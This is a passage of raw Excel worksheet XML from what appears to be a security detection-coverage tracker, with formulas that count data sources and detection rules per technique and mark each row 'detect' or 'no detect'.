      </c>
      <c r="F358" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G358" s="9" cm="1">
        <f t="array" ref="G358">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H358" s="9" t="str" cm="1">
        <f t="array" ref="H358">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I358" s="9" t="str" cm="1">
        <f t="array" ref="I358">IF(SUM(IF($C358=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C358=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J358" s="9" t="str" cm="1">
        <f t="array" ref="J35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58" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M358" s="9" cm="1">
        <f t="array" ref="M358">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N358" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O358" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P358" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S35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58" t="s">
        <v>658</v>
      </c>
      <c r="U358" t="s">
        <v>1798</v>
      </c>
      <c r="V358" t="s">
        <v>1799</v>
      </c>
      <c r="W358" t="b">
        <v>1</v>
      </c>
      <c r="X358" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="359" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A359" t="s">
        <v>1769</v>
      </c>
      <c r="B359" t="s">
        <v>1800</v>
      </c>
      <c r="C359" t="s">
        <v>1801</v>
      </c>
      <c r="D359" t="s">
        <v>646</v>
      </c>
      <c r="E359" t="s">
        <v>1802</v>
      </c>
      <c r="F359" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G359" s="9" cm="1">
        <f t="array" ref="G359">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H359" s="9" t="str" cm="1">
        <f t="array" ref="H359">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I359" s="9" t="str" cm="1">
        <f t="array" ref="I359">IF(SUM(IF($C359=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C359=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J359" s="9" t="str" cm="1">
        <f t="array" ref="J35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59" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M359" s="9" cm="1">
        <f t="array" ref="M359">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N359" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O359" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P359" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S35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59" t="s">
        <v>386</v>
      </c>
      <c r="U359" t="s">
        <v>1803</v>
      </c>
      <c r="V359" t="s">
        <v>1804</v>
      </c>
      <c r="W359" t="b">
        <v>1</v>
      </c>
      <c r="X359" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="360" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A360" t="s">
        <v>1769</v>
      </c>
      <c r="B360" t="s">
        <v>1805</v>
      </c>
      <c r="C360" t="s">
        <v>1806</v>
      </c>
      <c r="D360" t="s">
        <v>646</v>
      </c>
      <c r="E360" t="s">
        <v>1780</v>
      </c>
      <c r="F360" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G360" s="9" cm="1">
        <f t="array" ref="G360">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H360" s="9" t="str" cm="1">
        <f t="array" ref="H360">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I360" s="9" t="str" cm="1">
        <f t="array" ref="I360">IF(SUM(IF($C360=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C360=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J360" s="9" t="str" cm="1">
        <f t="array" ref="J36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60" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M360" s="9" cm="1">
        <f t="array" ref="M360">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N360" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O360" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P360" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S36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60" t="s">
        <v>386</v>
      </c>
      <c r="U360" t="s">
        <v>1807</v>
      </c>
      <c r="V360" t="s">
        <v>1808</v>
      </c>
      <c r="W360" t="b">
        <v>1</v>
      </c>
      <c r="X360" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="361" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A361" t="s">
        <v>1769</v>
      </c>
      <c r="B361" t="s">
        <v>1809</v>
      </c>
      <c r="C361" t="s">
        <v>311</v>
      </c>
      <c r="D361" t="s">
        <v>646</v>
      </c>
      <c r="E361" t="s">
        <v>1810</v>
      </c>
      <c r="F361" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G361" s="9" cm="1">
        <f t="array" ref="G361">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H361" s="9" t="str" cm="1">
        <f t="array" ref="H361">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I361" s="9" t="str" cm="1">
        <f t="array" ref="I361">IF(SUM(IF($C361=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C361=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J361" s="9" t="str" cm="1">
        <f t="array" ref="J36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61" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M361" s="9" cm="1">
        <f t="array" ref="M361">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N361" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O361" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P361" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S36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61" t="s">
        <v>386</v>
      </c>
      <c r="U361" t="s">
        <v>1811</v>
      </c>
      <c r="V361" t="s">
        <v>1812</v>
      </c>
      <c r="W361" t="b">
        <v>1</v>
      </c>
      <c r="X361" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="362" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A362" t="s">
        <v>1769</v>
      </c>
      <c r="B362" t="s">
        <v>1813</v>
      </c>
      <c r="C362" t="s">
        <v>1814</v>
      </c>
      <c r="D362" t="s">
        <v>646</v>
      </c>
      <c r="E362" t="s">
        <v>1810</v>
      </c>
      <c r="F362" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G362" s="9" cm="1">
        <f t="array" ref="G362">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H362" s="9" t="str" cm="1">
        <f t="array" ref="H362">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I362" s="9" t="str" cm="1">
        <f t="array" ref="I362">IF(SUM(IF($C362=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C362=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J362" s="9" t="str" cm="1">
        <f t="array" ref="J36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62" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M362" s="9" cm="1">
        <f t="array" ref="M362">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N362" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O362" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P362" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S36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62" t="s">
        <v>386</v>
      </c>
      <c r="U362" t="s">
        <v>1815</v>
      </c>
      <c r="V362" t="s">
        <v>1816</v>
      </c>
      <c r="W362" t="b">
        <v>1</v>
      </c>
      <c r="X362" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="363" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A363" t="s">
        <v>1769</v>
      </c>
      <c r="B363" t="s">
        <v>1817</v>
      </c>
      <c r="C363" t="s">
        <v>1818</v>
      </c>
      <c r="D363" t="s">
        <v>646</v>
      </c>
      <c r="E363" t="s">
        <v>1661</v>
      </c>
      <c r="F363" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G363" s="9" cm="1">
        <f t="array" ref="G363">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H363" s="9" t="str" cm="1">
        <f t="array" ref="H363">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I363" s="9" t="str" cm="1">
        <f t="array" ref="I363">IF(SUM(IF($C363=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C363=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J363" s="9" t="str" cm="1">
        <f t="array" ref="J36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63" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M363" s="9" cm="1">
        <f t="array" ref="M363">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N363" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O363" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P363" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S36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63" t="s">
        <v>386</v>
      </c>
      <c r="U363" t="s">
        <v>1819</v>
      </c>
      <c r="V363" t="s">
        <v>1820</v>
      </c>
      <c r="W363" t="b">
        <v>1</v>
      </c>
      <c r="X363" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="364" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A364" t="s">
        <v>1769</v>
      </c>
      <c r="B364" t="s">
        <v>1821</v>
      </c>
      <c r="C364" t="s">
        <v>1822</v>
      </c>
      <c r="D364" t="s">
        <v>646</v>
      </c>
      <c r="E364" t="s">
        <v>1775</v>
      </c>
      <c r="F364" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G364" s="9" cm="1">
        <f t="array" ref="G364">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H364" s="9" t="str" cm="1">
        <f t="array" ref="H364">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I364" s="9" t="str" cm="1">
        <f t="array" ref="I364">IF(SUM(IF($C364=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C364=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J364" s="9" t="str" cm="1">
        <f t="array" ref="J36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64" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M364" s="9" cm="1">
        <f t="array" ref="M364">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N364" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O364" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P364" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S36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64" t="s">
        <v>386</v>
      </c>
      <c r="U364" t="s">
        <v>1823</v>
      </c>
      <c r="V364" t="s">
        <v>1824</v>
      </c>
      <c r="W364" t="b">
        <v>1</v>
      </c>
      <c r="X364" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="365" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A365" t="s">
        <v>1769</v>
      </c>
      <c r="B365" t="s">
        <v>1825</v>
      </c>
      <c r="C365" t="s">
        <v>1826</v>
      </c>
      <c r="D365" t="s">
        <v>646</v>
      </c>
      <c r="E365" t="s">
        <v>657</v>
      </c>
      <c r="F365" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G365" s="9" cm="1">
        <f t="array" ref="G365">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H365" s="9" t="str" cm="1">
        <f t="array" ref="H365">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I365" s="9" t="str" cm="1">
        <f t="array" ref="I365">IF(SUM(IF($C365=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C365=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J365" s="9" t="str" cm="1">
        <f t="array" ref="J36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65" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M365" s="9" cm="1">
        <f t="array" ref="M365">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N365" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O365" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P365" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S36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65" t="s">
        <v>386</v>
      </c>
      <c r="U365" t="s">
        <v>1827</v>
      </c>
      <c r="V365" t="s">
        <v>1828</v>
      </c>
      <c r="W365" t="b">
        <v>1</v>
      </c>
      <c r="X365" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="366" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A366" t="s">
        <v>1769</v>
      </c>
      <c r="B366" t="s">
        <v>1829</v>
      </c>
      <c r="C366" t="s">
        <v>1830</v>
      </c>
      <c r="D366" t="s">
        <v>646</v>
      </c>
      <c r="E366" t="s">
        <v>657</v>
      </c>
      <c r="F366" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G366" s="9" cm="1">
        <f t="array" ref="G366">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H366" s="9" t="str" cm="1">
        <f t="array" ref="H366">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I366" s="9" t="str" cm="1">
        <f t="array" ref="I366">IF(SUM(IF($C366=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C366=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J366" s="9" t="str" cm="1">
        <f t="array" ref="J36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66" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M366" s="9" cm="1">
        <f t="array" ref="M366">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N366" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O366" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P366" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S36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66" t="s">
        <v>658</v>
      </c>
      <c r="U366" t="s">
        <v>1831</v>
      </c>
      <c r="V366" t="s">
        <v>1832</v>
      </c>
      <c r="W366" t="b">
        <v>1</v>
      </c>
      <c r="X366" t="s">
        <v>1769</v>
      </c>
    </row>
    <row r="367" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A367" t="s">
        <v>1769</v>
      </c>
      <c r="B367" t="s">
        <v>1833</v>
      </c>
      <c r="C367" t="s">
        <v>1834</v>
      </c>
      <c r="D367" t="s">
        <v>646</v>
      </c>
      <c r="E367" t="s">
        <v>1802</v>
      </c>
      <c r="F367" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G367" s="9" cm="1">
        <f t="array" ref="G367">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H367" s="9" t="str" cm="1">
        <f t="array" ref="H367">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I367" s="9" t="str" cm="1">
        <f t="array" ref="I367">IF(SUM(IF($C367=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C367=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J367" s="9" t="str" cm="1">
        <f t="array" ref="J36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67" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
